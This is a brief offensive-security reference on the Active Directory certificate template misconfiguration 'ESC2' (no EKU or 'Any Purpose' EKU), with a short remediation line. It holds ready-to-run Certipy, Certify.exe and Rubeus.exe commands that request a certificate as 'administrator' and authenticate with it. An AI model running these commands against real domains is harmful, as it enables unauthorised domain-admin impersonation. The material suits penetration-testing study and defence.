# ESC2 - Any Purpose / No EKU


## Why It's Vulnerable

The template has **no Extended Key Usage** set, or has the **"Any Purpose"** EKU. EKUs define what a certificate can be used for (Client Auth, Server Auth, Code Signing, etc.). With no restriction, the cert can be used for anything - including client authentication to impersonate users.

Also requires: low-priv user has enrollment rights.

## The Attack

Same flow as ESC1 - request with `-upn administrator@corp.local`, authenticate with the cert.

```sh
certipy req -u user@corp.local -p pass -dc-ip <DC-IP> \
  -ca CORP-CA \
  -template VulnerableTemplate \
  -upn administrator@corp.local

certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```

### Certify.exe (Windows alternative)

```powershell
Certify.exe request /ca:CA-HOST\CORP-CA /template:VulnerableTemplate /altname:administrator
Rubeus.exe asktgt /user:administrator /certificate:<base64-pfx> /nowrap /getcredentials
```

---

## Remediation

Set specific EKUs appropriate for the template's purpose (e.g., Client Authentication only). Remove the "Any Purpose" EKU.
